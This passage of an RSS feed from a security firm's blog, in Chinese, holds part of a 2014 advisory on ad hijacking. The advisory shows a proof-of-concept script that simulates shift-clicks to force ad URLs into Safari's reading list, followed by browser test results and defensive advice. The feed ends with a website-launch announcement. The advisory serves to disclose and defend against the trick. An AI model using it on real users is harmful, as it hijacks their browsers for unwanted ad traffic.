    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;http://google.com/?&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;force_add_url_to_readinglist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;

  &lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Test: FORCE_ADD_URL_TO_READINGLIST&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;利用「&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/event.initMouseEvent&quot;&gt;initMouseEvent&lt;/a&gt;」模擬滑鼠的點擊，在 URL 上按下 Shift 鍵點擊。在一般瀏覽器中是「開啟新視窗」，在 Safari 中則是「加入閱讀清單」了，因此形成廣告視窗不斷加入閱讀清單的現象。廣告商利用這種手法增加廣告的點擊率，只要瀏覽器沒有安裝阻擋廣告的套件或者是阻擋「彈出式視窗」，你就會成為流量的貢獻者。&lt;/p&gt;

&lt;p&gt;經過我們的測試，Internet Explorer、Mozilla Firefox 不會受這類攻擊影響，Google Chrome、Opera 則會被內建的 Pop-up 視窗阻擋功能擋下。但若是直接模擬點擊，則全數瀏覽器都會受影響導向至 URL。雖然這種類型的攻擊不會造成實質上的損失跟危害，但若是結合其他惡意手法將可以造成攻擊。例如透過網站掛碼將使用者導向至惡意網站等等。&lt;/p&gt;

&lt;p&gt;若要避免此類型攻擊，有以下幾個建議方案：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;安裝 NoScript 類型套件，僅允許可信賴的網站執行 JavaScript&lt;/li&gt;
  &lt;li&gt;開啟「彈出式視窗」阻擋功能，並將網站安全性等級提高。&lt;/li&gt;
  &lt;li&gt;安裝 AdBlock 等廣告阻擋套件（但會影響網站營收）&lt;/li&gt;
  &lt;li&gt;使用最新版本瀏覽器以策安全&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;網頁型的攻擊越來越多樣化，除了依賴瀏覽器本身的保護並輔以第三方安全套件之外，更需要使用者本身的安全意識，才能安心暢快的瀏覽網路！&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/03/06/qiyou-ads-hijacking/</link>
                <guid>https://devco.re/blog/2014/03/06/qiyou-ads-hijacking</guid>
                <pubDate>Thu, 06 Mar 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>DEVCORE 新網站上線！</title>
                <description>&lt;p&gt;DEVCORE 的新網站上線了！&lt;br /&gt;&lt;br /&gt;
非常感謝專業的 &lt;a href=&quot;http://evendesign.tw/&quot;&gt;EVENDESIGN&lt;/a&gt; 幫我們設計精美的網站！&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;我們目前主要服務項目為滲透測試、資安教育訓練、資安事件處理、資安顧問服務，&lt;br /&gt;&lt;br /&gt;
各項服務的詳細內容可參考 &lt;a href=&quot;http://devco.re/services/penetration-test&quot;&gt;Services&lt;/a&gt; 頁面。&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;同時，在官網中我們將會不定期提供最新的資安新知及技術文章，&lt;br /&gt;&lt;br /&gt;
希望藉由我們的力量讓大眾更清楚資訊安全的重要。&lt;br /&gt;&lt;br /&gt;
並且透過站內的教學文獻，讓開發者、管理者進一步了解駭客的思維、攻防的手法，&lt;br /&gt;&lt;br /&gt;
知己知彼，才能百戰不怠。瞭解如何攻擊，更能知道如何防禦。&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;若對我們的網站內容或服務有任何建議，歡迎您隨時與我們聯繫。&lt;br /&gt;&lt;br /&gt;
希望我們能為您的企業資訊安全最佳把關者！&lt;br /&gt;&lt;br /&gt;
歡迎隨時聯絡我們！ &lt;code class=&quot;highlighter-rouge&quot;&gt;contact [at] devco.re&lt;/code&gt;&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/02/27/devcore-new-website/</link>
                <guid>https://devco.re/blog/2014/02/27/devcore-new-website</guid>
                <pubDate>Thu, 27 Feb 2014 00:00:00 +0800</pubDate>
        </item>


</channel>
</rss>
